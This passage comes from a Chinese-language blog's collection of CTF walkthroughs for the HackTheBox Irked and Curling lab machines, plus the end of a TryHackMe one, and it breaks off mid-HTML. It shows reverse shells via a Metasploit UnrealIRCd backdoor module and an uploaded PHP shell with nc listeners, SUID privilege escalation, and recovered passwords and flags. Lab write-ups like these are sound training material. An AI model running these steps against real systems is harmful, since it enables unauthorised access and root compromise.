payload\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.18.112.117] from (UNKNOWN) [10.10.84.23] 43604\nbash: cannot set terminal process group (16146): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@overpass-prod:~# whoami&&id\nwhoami&&id                                                                                                                                    \nroot                                                                                                                                          \nuid=0(root) gid=0(root) groups=0(root)\n```\n\n成功拿到了 root 权限\n\n```bash\nroot@overpass-prod:~# ls                                                                                                                      \nls                                                                                                                                            \nbuildStatus                                                                                                                                   \nbuilds                                                                                                                                        \ndownloads                                                                                                                                     \ngo                                                                                                                                            \nroot.txt                                                                                                                                      \nsrc                                                                                                                                           \nroot@overpass-prod:~# cat root.txt                                                                                                            \ncat root.txt                                                                                                                                  \nthm{7f336f8c359dbac18d54fdd64ea753bb}\n```\n\n成功拿到了 root 权限的 flag 文件\n","tags":["TryHackMe"]},{"title":"Irked - Hackthebox","url":"/2022/04/29/Hackthebox/Easy/Hackthebox-Irked/","content":"\n# Hackthebox - Irked\n# 靶场信息\n![](Hackthebox-Irked/2e3a4dff-7102-4a8c-847b-44463ff7d309.png)\n\n# 靶场类型\n![](Hackthebox-Irked/d9b9ac71-2069-422f-bca0-f2e16f6b89a1.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.117                                                                                                                                        1 ⚙\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-29 10:23 CST\nNmap scan report for 10.10.10.117\nHost is up (0.17s latency).\nNot shown: 65528 closed ports\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)\n| ssh-hostkey:\n|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)\n|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)\n|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)\n|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)\n80/tcp    open  http    Apache httpd 2.4.10 ((Debian))\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Site doesn't have a title (text/html).\n111/tcp   open  rpcbind 2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100024  1          49297/tcp   status\n|   100024  1          50541/udp   status\n|   100024  1          51791/udp6  status\n|_  100024  1          60368/tcp6  status\n6697/tcp  open  irc     UnrealIRCd\n8067/tcp  open  irc     UnrealIRCd\n49297/tcp open  status  1 (RPC #100024)\n65534/tcp open  irc     UnrealIRCd\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/29%OT=22%CT=1%CU=32566%PV=Y%DS=2%DC=T%G=Y%TM=626B4C5\nOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 143/tcp)\nHOP RTT       ADDRESS\n1   170.14 ms 10.10.14.1\n2   170.23 ms 10.10.10.117\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 47.84 seconds\n```\n这边有一个 111 端口，看着像是 rpcbind 方面的漏洞，好像是缓冲区溢出相关的，使用 msf 检查试试\n\n## Metasploit\n```bash\nmsf6 auxiliary(scanner/misc/sunrpc_portmapper) > show options \n\nModule options (auxiliary/scanner/misc/sunrpc_portmapper):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   PROTOCOL  tcp              yes       Protocol to use (Accepted: tcp, udp)\n   RHOSTS    10.10.10.117     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT     111              yes       The target port (TCP)\n   THREADS   1                yes       The number of concurrent threads (max one per host)\n```\n设置好后去执行\n\n```bash\nmsf6 auxiliary(scanner/misc/sunrpc_portmapper) > exploit \n\n[+] 10.10.10.117:111      - SunRPC Programs for 10.10.10.117\n================================\n\n Name     Number  Version  Port   Protocol\n ----     ------  -------  ----   --------\n rpcbind  100000  4        111    tcp\n rpcbind  100000  3        111    tcp\n rpcbind  100000  2        111    tcp\n rpcbind  100000  4        111    udp\n rpcbind  100000  3        111    udp\n rpcbind  100000  2        111    udp\n status   100024  1        50541  udp\n status   100024  1        49297  tcp\n\n[*] 10.10.10.117:111      - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n扫描到了，但是无法利用成功，换个其他地方继续看\n\n## HTTP\n![](Hackthebox-Irked/9b0067e6-70a4-48bc-bdd0-e6435cb989cb.png)\n\nWeb 服务提示 IRC 可以正常工作，这里 6697、8067、65534 似乎都是 IRC 服务，去搜索一下 IRC 是什么东西\n\n![](Hackthebox-Irked/dcdac2f8-04a4-4d5e-bcf7-5b284ac7d6e4.png)\n\n搜索 WIKI 发现，IRC 是一种应用层的协议，主要用于群体聊天，通常使用的端口是 6667 和 6697，正好我们这里有 6697\n\n# 漏洞利用\n```bash\nmsf6 > search Unreal\n\nMatching Modules\n================\n\n   #  Name                                        Disclosure Date  Rank       Check  Description\n   -  ----                                        ---------------  ----       -----  -----------\n   0  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 \"secure\" Overflow (Linux)\n   1  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 \"secure\" Overflow (Win32)\n   2  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution\n\nInteract with a module by name or index. For example info 2, use 2 or use exploit/unix/irc/unreal_ircd_3281_backdoor\n```\n使用 msf 搜到了一个脚本，去使用一下\n\n```bash\nmsf6 > use 2\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options \n\nModule options (exploit/unix/irc/unreal_ircd_3281_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   6667             yes       The target port (TCP)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n```\n设置好 RHOSTS，然后执行\n\n```bash\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse\npayload => cmd/unix/reverse\n\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 10.10.10.117\nrhosts => 10.10.10.117\n\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost 10.10.16.12\nlhost => 10.10.16.12\n\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697\nrport => 6697\n```\n```bash\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit \n\n[*] Started reverse TCP double handler on 10.10.16.12:4444 \n[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...\n    :irked.htb NOTICE AUTH :*** Looking up your hostname...\n[*] 10.10.10.117:6697 - Sending backdoor command...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo SUUjSBbQaAoSC5R9;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: \"SUUjSBbQaAoSC5R9\\r\\n\"\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (10.10.16.12:4444 -> 10.10.10.117:51640) at 2022-04-28 22:55:02 -0400\n\nwhoami&&id\nircd\nuid=1001(ircd) gid=1001(ircd) groups=1001(ircd)\n```\n接着使用 shell 进入 shell 模式\n\n```bash\nshell\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n```bash\nircd@irked:/home/djmardov/Documents$ ls -la\nls -la\ntotal 16\ndrwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .\ndrwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..\n-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup\n-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt\n```\n有点奇怪，明明是 Linux 系统，djmardov 用户目录却是 Windows 的系统结构\n\n在目录 /home/djmardov/Documents 中找到了 user.txt flag 文件，但是我们权限不够，还有一个 .backup 文件，我们有查看权限，看一下是什么\n\n# 权限提升\n## User\n```bash\nircd@irked:/home/djmardov/Documents$ cat .backup\ncat .backup\nSuper elite steg backup pw\nUPupDOWNdownLRlrBAbaSSss\n```\n我直接拿着这段密码去登录 djmardov 账户是不行的，提示失败\n\n然后看着提示，这似乎是一段 steg 的编码，而我们又没有要解密的文件，这时候我想起来，密码一般会藏在哪？当然是图片里，而哪里有图片呢？HTTP 服务的主页有一张图片！\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# steghide extract -sf irked.jpg                                            1 ⨯\nEnter passphrase: \nwrote extracted data to \"pass.txt\".\n```\n在这提示我们输入密码，刚才 .backup 里的密码就有用处了，输入密码后解压出来一个 pass.txt 文件\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat pass.txt    \nKab6h+m+bbp2J:HG\n```\n得到了密码\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh djmardov@10.10.10.117     \ndjmardov@10.10.10.117's password: \n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Apr 28 04:38:52 2022 from 10.10.14.3\ndjmardov@irked:~$ whoami&&id\ndjmardov\nuid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)\n```\n成功提权到 user 用户\n\n```bash\ndjmardov@irked:~/Documents$ cat user.txt \n4a66a78b12dc0e661a59d3f5c0267a8e\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n```bash\ndjmardov@irked:~$ find / -user root -perm -4000 -print 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/openssh/ssh-keysign\n/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper\n/usr/sbin/exim4\n/usr/sbin/pppd\n/usr/bin/chsh\n/usr/bin/procmail\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/pkexec\n/usr/bin/X\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/viewuser\n/sbin/mount.nfs\n/bin/su\n/bin/mount\n/bin/fusermount\n/bin/ntfs-3g\n/bin/umount\n```\n使用 find 查找一下特殊权限文件\n\n找到了一个 /usr/bin/viewuser 文件，查看一下\n\n```bash\ndjmardov@irked:/usr/bin$ ./viewuser \nThis application is being devleoped to set and test user permissions\nIt is still being actively developed\n(unknown) :0           2022-04-28 02:46 (:0)\ndjmardov pts/5        2022-04-28 23:22 (10.10.16.12)\n/tmp/listusers: connect: Connection refused\n```\n发现这里似乎调用了一个 /tmp/listusers\n\n向 /tmp/listusers 写入文件\n\n```bash\necho \"/bin/sh\" > /tmp/listusers\n```\n接着执行 /usr/bin/viewuser\n\n```bash\ndjmardov@irked:/tmp$ echo \"/bin/sh\" > /tmp/listusers\ndjmardov@irked:/tmp$ /usr/bin/viewuser\nThis application is being devleoped to set and test user permissions\nIt is still being actively developed\n(unknown) :0           2022-04-28 02:46 (:0)\ndjmardov pts/5        2022-04-28 23:52 (10.10.16.12)\n# whoami&&id\nroot\nuid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)\n```\n成功提权到 root 权限\n\n```bash\n# cat /root/root.txt\n8d8e9e8be64654b6dccc3bff4522daf3\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Curling - Hackthebox","url":"/2022/04/28/Hackthebox/Easy/Hackthebox-Curling/","content":"\n# Hackthebox - Curling\n# 靶场信息\n![](Hackthebox-Curling/66a7ee16-791a-4bbc-88e7-954dbf76d46b.png)\n\n# 靶场类型\n![](Hackthebox-Curling/4d877af9-efa7-4e5b-b060-447dfdc01db7.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.150\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-26 21:40 EDT\nNmap scan report for 10.10.10.150\nHost is up (0.34s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: Joomla! - Open Source Content Management\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Home\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/26%OT=22%CT=1%CU=41478%PV=Y%DS=2%DC=T%G=Y%TM=62689FB\nOS:F%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   338.76 ms 10.10.14.1\n2   339.30 ms 10.10.10.150\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 175.76 seconds\n```\n## HTTP\n![](Hackthebox-Curling/f5db0f7f-b519-4b90-88d6-e479da0d17be.png)\n\n这一台似乎是关于冰壶的，到处看了一下，没看到什么突破口，弱口令也没有登入进去，去 Fuzz 一下\n\n## Fuzz\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gobuster dir -u http://10.10.10.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error                                                                                  1 ⨯\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.150/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/27 01:33:22 Starting gobuster in directory enumeration mode\n===============================================================\n/media                (Status: 301) [Size: 312] [--> http://10.10.10.150/media/]\n/templates            (Status: 301) [Size: 316] [--> http://10.10.10.150/templates/]\n/images               (Status: 301) [Size: 313] [--> http://10.10.10.150/images/]   \n/modules              (Status: 301) [Size: 314] [--> http://10.10.10.150/modules/]  \n/bin                  (Status: 301) [Size: 310] [--> http://10.10.10.150/bin/]      \n/plugins              (Status: 301) [Size: 314] [--> http://10.10.10.150/plugins/]  \n/includes             (Status: 301) [Size: 315] [--> http://10.10.10.150/includes/] \n/language             (Status: 301) [Size: 315] [--> http://10.10.10.150/language/] \n/components           (Status: 301) [Size: 317] [--> http://10.10.10.150/components/]\n/libraries            (Status: 301) [Size: 316] [--> http://10.10.10.150/libraries/] \n/cache                (Status: 301) [Size: 312] [--> http://10.10.10.150/cache/]     \n/tmp                  (Status: 301) [Size: 310] [--> http://10.10.10.150/tmp/]       \n/layouts              (Status: 301) [Size: 314] [--> http://10.10.10.150/layouts/]   \n/administrator        (Status: 301) [Size: 320] [--> http://10.10.10.150/administrator/]\n/cli                  (Status: 301) [Size: 310] [--> http://10.10.10.150/cli/]          \n/server-status        (Status: 403) [Size: 277]                                         \n\n===============================================================                                                                                                                                                    \n2022/04/27 01:59:29 Finished\n===============================================================\n```\n挨个去看一下\n\n![](Hackthebox-Curling/7827e73d-2e33-4950-842c-d51e6d5c613a.png)\n\n在 /administrator 目录下，找到了一个 Joomla，但是不知道版本，搜索了一下 Joomla 也没有默认密码，继续看看\n\n```bash\n</body>\n      <!-- secret.txt -->\n</html>\n```\n在首页的源代码最下面的 359 行发现了一个文件，去查看一下\n\n```bash\nQ3VybGluZzIwMTgh\n\n┌──(root💀kali)-[~/Desktop]\n└─# echo Q3VybGluZzIwMTgh|base64 -d            \nCurling2018!\n```\n我猜想这应该是一个密码\n\n![](Hackthebox-Curling/b4a6e7e3-eea7-4d48-bccd-66c1ab4a19dc.png)\n\n然后在首页面获取到一个账号\n\n```bash\nusername = Floris\npassword = Curling2018!\n```\n![](Hackthebox-Curling/10d7687a-048c-47c8-b76c-988b5916a186.png)\n\n登录成功，但这里似乎没什么东西，我们尝试去 Joomla 登录试试\n\n![](Hackthebox-Curling/efa895dc-539b-4cfb-8fc0-edc26ce8d39b.png)\n\n登录成功，东西比较多，到处找找有没有突破口\n\n# 漏洞利用\n![](Hackthebox-Curling/c3a80c56-185b-4f9b-8407-1f30288e0599.png)\n\n选择首页面的 Global → Media → Legal Extensions (File Types)\n\n然后添加上我们要的后缀 php\n\n修改好以后点击 Save&close\n\n接着使用 nc 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n然后访问 Extensions → Templates → Templates → Beez3 Details and Files\n\n接着添加一个新文件\n\n![](Hackthebox-Curling/8560ce82-6f92-470a-930d-4779a6607b05.png)\n\n> [https://github.com/LucifielHack/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/LucifielHack/php-reverse-shell/blob/master/php-reverse-shell.php)\n\n把我们的 reverse-shell.php 给传上去\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl http://10.10.10.150/templates/beez3/shell.php\n```\n接着请求一下我们的 shell\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.16.12] from (UNKNOWN) [10.10.10.150] 40030\nLinux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n 06:24:26 up 31 min,  0 users,  load average: 0.06, 0.01, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (1262): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@curling:/$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功拿到一个 shell\n\n接着修复一下shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n# 权限提升\n## User\n```bash\nwww-data@curling:/home$ ls\nfloris\nwww-data@curling:/home$ cd floris\nwww-data@curling:/home/floris$ ls\nadmin-area  password_backup  user.txt\n```\n在 /home/floris 中发现了一个目录 admin-area 一个文件 password\\_backup\n\n其中目录我们没权限访问，但文件我们有权限访问\n\n```bash\nwww-data@curling:/home/floris$ cat password_backup \n00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..\n00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4\n00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`\n00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......\n00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..\n00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4\n00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..\n00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x\n00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1\n00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s.\"\n000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.\n000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..\n000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C\n000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..\n000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.\n000000f0: 819b bb48                                ...H\n```\n查看后发现是乱码，使用 xxd 查看并保存到文件\n\n```bash\nwww-data@curling:/home/floris$ xxd -r password_backup > /tmp/backup\n```\n```bash\nwww-data@curling:/home/floris$ cd /tmp\nwww-data@curling:/tmp$ file backup \nbackup: bzip2 compressed data, block size = 900k\n```\n查看文件类型发现是一个 bzip2 的类型\n\n```bash\nwww-data@curling:/tmp$ mv backup backup.bz2\nwww-data@curling:/tmp$ bzip2 -d backup.bz2 \nwww-data@curling:/tmp$ ls\nbackup\n```\n咱们把这个文件解压出来，然后再去看看\n\n```bash\nwww-data@curling:/tmp$ ls\nbackup\nwww-data@curling:/tmp$ file backup \nbackup: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix\n```\n解压出来后发现是个 gzip 文件，还得解压一次\n\n```bash\nwww-data@curling:/tmp$ mv backup backup.gz\nwww-data@curling:/tmp$ tar xvf backup.gz\n```\n```bash\nwww-data@curling:/tmp$ ls\nbackup.out\nwww-data@curling:/tmp$ file backup.out \nbackup.out: POSIX tar archive (GNU)\n```\n反正这里得解压好几次，给我弄的有点晕，还以为是在无限循环呢\n\n```bash\nwww-data@curling:/tmp$ mv backup.out backup.tar\nwww-data@curling:/tmp$ tar xvf backup.tar \npassword.txt\n```\n总算解压完了，查看一下文件\n\n```bash\nwww-data@curling:/tmp$ cat password.txt \n5d<wdCbdZu)|hChXll\n```\n感觉这是用户 floris 的密码了，去登录 ssh 试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh floris@10.10.10.150       \nThe authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.\nECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.150' (ECDSA) to the list of known hosts.\nfloris@10.10.10.150's password: \nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu Apr 28 06:53:07 UTC 2022\n\n  System load:  0.0               Processes:            172\n  Usage of /:   49.2% of 9.78GB   Users logged in:      0\n  Memory usage: 25%               IP address for ens33: 10.10.10.150\n  Swap usage:   0%\n\n0 updates can be applied immediately.\n\nLast login: Wed Sep  8 11:42:07 2021 from 10.10.14.15\nfloris@curling:~$ whoami&&id\nfloris\nuid=1000(floris) gid=1004(floris) groups=1004(floris)\n```\n成功提权到 user 权限用户\n\n```bash\nfloris@curling:~$ cat user.txt \n65dd1df0713b40d88ead98cf11b8530b\n```\n成功拿到一个 user 权限的 flag 文件\n\n## Root\n```bash\nfloris@curling:~$ sudo -l\n[sudo] password for floris: \nSorry, user floris may not run sudo on curling.\n```\nsudo -l 没有东西，咱们还是着眼于 admin-area 目录吧\n\n```bash\nfloris@curling:~/admin-area$ ls -la\ntotal 28\ndrwxr-x--- 2 root   floris  4096 May 22  2018 .\ndrwxr-xr-x 6 floris floris  4096 May 22  2018 ..\n-rw-rw---- 1 root   floris    25 Apr 28 06:55 input\n-rw-rw---- 1 root   floris 14236 Apr 28 06:55 report\n```\n这边是有两个文件，并且咱们有查看和写入权限\n\n```bash\nfloris@curling:~/admin-area$ cat input \nurl = \"http://127.0.0.1\"\n```\n```bash\nfloris@curling:~/admin-area$ cat report \n<!DOCTYPE html>\n<html lang=\"en-gb\" dir=\"ltr\">\n<head>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <meta charset=\"utf-8\" />\n        <base href=\"http://127.0.0.1/\" />\n        <meta name=\"description\" content=\"best curling site on the planet!\" />\n        <meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" />\n        <title>Home</title>\n        <link href=\"/index.php?format=feed&type=rss\" rel=\"alternate\" type=\"application/rss+xml\" title=\"RSS 2.0\" />\n        <link href=\"/index.php?format=feed&type=atom\" rel=\"alternate\" type=\"application/atom+xml\" title=\"Atom 1.0\" />\n        <link href=\"/templates/protostar/favicon.ico\" rel=\"shortcut icon\" type=\"image/vnd.microsoft.icon\" />\n        <link href=\"/templates/protostar/css/template.css?b6bf078482bc6a711b54fa9e74e19603\" rel=\"stylesheet\" />\n        <link href=\"https://fonts.googleapis.com/css?family=Open+Sans\" rel=\"stylesheet\" />\n        <style>\n\n        h1, h2, h3, h4, h5, h6, .site-title {\n                font-family: 'Open Sans', sans-serif;\n        }\n        </style>\n        <script type=\"application/json\" class=\"joomla-script-options new\">{\"csrf.token\":\"e6b8a82d84a03e7e05d6452f52f975f7\",\"system.paths\":{\"root\":\"\",\"base\":\"\"},\"system.keepalive\":{\"interval\":840000,\"uri\":\"\\/index.php\\/component\\/ajax\\/?format=json\"}}</script>\n        <script src=\"/media/jui/js/jquery.min.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/jui/js/jquery-noconflict.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/jui/js/jquery-migrate.min.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/system/js/caption.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/jui/js/bootstrap.min.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/templates/protostar/js/template.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <!--[if lt IE 9]><script src=\"/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603\"></script><![endif]-->\n        <script src=\"/media/system/js/core.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <!--[if lt IE 9]><script src=\"/media/system/js/polyfill.event.js?b6bf078482bc6a711b54fa9e74e19603\"></script><![endif]-->\n        <script src=\"/media/system/js/keepalive.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script>\njQuery(window).on('load',  function() {\n                                new JCaption('img.caption');\njQuery(function($){ initTooltips(); $(\"body\").on(\"subform-row-add\", initTooltips); function initTooltips (event, container) { container = container || document;$(container).find(\".hasTooltip\").tooltip({\"html\": true,\"container\": \"body\"});} });\n        </script>\n\n</head>\n<body class=\"site com_content view-featured no-layout no-task itemid-101\">\n        <!-- Body -->\n        <div class=\"body\" id=\"top\">\n                <div 